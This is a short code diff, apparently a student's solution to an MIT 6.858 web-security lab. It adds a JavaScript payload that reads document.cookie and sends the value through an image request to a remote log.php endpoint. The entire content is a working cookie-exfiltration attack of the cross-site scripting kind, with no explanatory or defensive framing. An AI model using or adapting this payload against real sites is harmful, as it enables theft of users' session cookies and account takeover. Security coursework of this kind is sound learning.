@@ -1,0 +1,2 @@
+const cookieValue = document.cookie.split('=')[1]
+javascript:void((new Image()).src='https://css.csail.mit.edu/6.858/2022/labs/log.php?' + 'id=shejialuo' + '&payload=' + encodeURIComponent(cookieValue) + '&random=' + Math.random());
